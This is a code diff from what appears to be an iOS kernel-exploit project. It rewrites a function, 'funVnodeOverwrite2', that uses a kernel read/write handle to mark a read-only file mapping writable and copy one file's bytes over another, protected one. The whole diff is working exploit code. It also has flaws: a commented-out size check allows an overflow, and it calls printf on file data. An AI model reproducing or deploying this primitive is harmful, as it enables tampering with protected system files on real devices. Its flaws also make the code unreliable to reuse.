@@ -1098,70 +1098,65 @@ uint64_t task_get_vm_map(uint64_t kfd, uint64_t task_ptr)
 #pragma mark overwrite2
 uint64_t funVnodeOverwrite2(u64 kfd, char* tofile, char* fromfile) {
     printf("attempting opa's method\n");
-    int to_fd = open(tofile, O_RDONLY);
-    if (to_fd < 0) {
-        return 0;
-    }
+    int to_file_index = open(tofile, O_RDONLY);
+    if (to_file_index == -1) return -1;
+    off_t to_file_size = lseek(to_file_index, 0, SEEK_END);
 
-    // Get the size of the source file
-    off_t to_file_size = lseek(to_fd, 0, SEEK_END);
-    if (to_file_size <= 0) {
-        close(to_fd);
-        return 0;
-    }
+    int from_file_index = open(fromfile, O_RDONLY);
+    if (from_file_index == -1) return -1;
+    off_t from_file_size = lseek(from_file_index, 0, SEEK_END);
+
+//    if(to_file_size < from_file_size) {
+//        close(from_file_index);
+//        close(to_file_index);
+//        printf("[-] File is too big to overwrite!\n");
+//        return -1;
+//    }
 
     //mmap as read only
     printf("mmap as readonly\n");
-    char* to_file_data = mmap(NULL, to_file_size, PROT_READ, MAP_SHARED, to_fd, 0);
-    if (to_file_data == MAP_FAILED) {
-        close(to_fd);
-        // Handle error mapping source file
-        return 0;
+
+    char* from_mapped = mmap(NULL, from_file_size, PROT_READ, MAP_PRIVATE, from_file_index, 0);
+    if (from_mapped == MAP_FAILED) {
+        perror("[-] Failed mmap (from_mapped)\n");
+        close(from_file_index);
+        close(to_file_index);
+        return -1;
     }
     
-    // set prot to re-
+    // set prot to rw-
     printf("task_get_vm_map -> vm ptr\n");
     uint64_t vm_ptr = task_get_vm_map(kfd, getTask(kfd, kfd));
-    uint64_t entry_ptr = vm_map_find_entry(kfd, vm_ptr, (uint64_t)to_file_data);
+    uint64_t entry_ptr = vm_map_find_entry(kfd, vm_ptr, (uint64_t)from_mapped);
     printf("set prot to rw-");
     vm_map_entry_set_prot(kfd, entry_ptr, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE);
     
-//    // Open the destination file for writing
-//    int to_fd = open(tofile, O_RDWR);
-//    if (to_fd < 0) {
-//        // Handle error opening destination file
-//        munmap(from_file_data, from_file_size);
-//        close(from_fd);
-//        return 0;
-//    }
-//
-//    // Get the size of the destination file
-//    off_t to_file_size = lseek(to_fd, 0, SEEK_END);
-//    if (to_file_size <= 0) {
-//        close(to_fd);
-//        munmap(from_file_data, from_file_size);
-//        close(from_fd);
-//        // Handle error getting destination file size
-//        return 0;
-//    }
-//
-//    }
-    
     // WRITE
-    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
+//    const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
+//
+//    size_t data_len = strlen(data);
+//    off_t file_size = lseek(to_file_index, 0, SEEK_END);
+//    if (file_size == -1) {
+//        perror("Failed lseek.");
+//    }
     
-    size_t data_len = strlen(data);
-    off_t file_size = lseek(to_fd, 0, SEEK_END);
-    if (file_size == -1) {
-        perror("Failed lseek.");
+    char* to_mapped = mmap(NULL, to_file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_file_index, 0);
+    if (to_mapped == MAP_FAILED) {
+        perror("[-] Failed mmap (to_mapped)");
+        close(from_file_index);
+        close(to_file_index);
+        return -1;
     }
+    printf(to_mapped);
     
-    char* mapped = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, to_fd, 0);
-    
+    memcpy(to_mapped, from_mapped, from_file_size);
     printf("done???????");
     // Cleanup
-    munmap(to_file_data, to_file_size);
-    close(to_fd);
+//    munmap(to_file_data, to_file_size);
+    munmap(from_mapped, from_file_size);
+    munmap(to_mapped, to_file_size);
+    close(from_file_index);
+    close(to_file_index);
 //    munmap(from_file_data, from_file_size);
 //    close(from_fd);
 
